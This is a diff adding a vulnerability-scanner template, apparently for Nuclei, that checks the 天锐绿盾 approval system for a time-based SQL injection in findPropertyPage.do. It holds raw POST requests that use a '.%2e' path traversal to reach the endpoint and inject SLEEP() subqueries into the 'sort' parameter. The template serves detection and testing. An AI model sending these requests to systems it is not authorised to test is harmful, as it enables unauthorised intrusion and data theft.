@@ -1,0 +1,42 @@
+id: poc-yaml-tipray-gsas-findpropertypage-do-sqli
+info:
+  name: 天锐绿盾审批系统 findPropertyPage.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 天锐绿盾
+  metadata:
+    product: 天锐绿盾审批系统
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/invoker/findPropertyPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        tenantId=1&categoryId=1&sort=id%20OR+(SELECT+1337+FROM+(SELECT(SLEEP(5)))test)&order=asc
+      - |
+        POST /trwfe/login.jsp/.%2e/invoker/findPropertyPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        tenantId=1&categoryId=1&sort=id%20OR+(SELECT+1337+FROM+(SELECT(SLEEP(8)))test)&order=asc
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"total":0,"rows":[]}'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
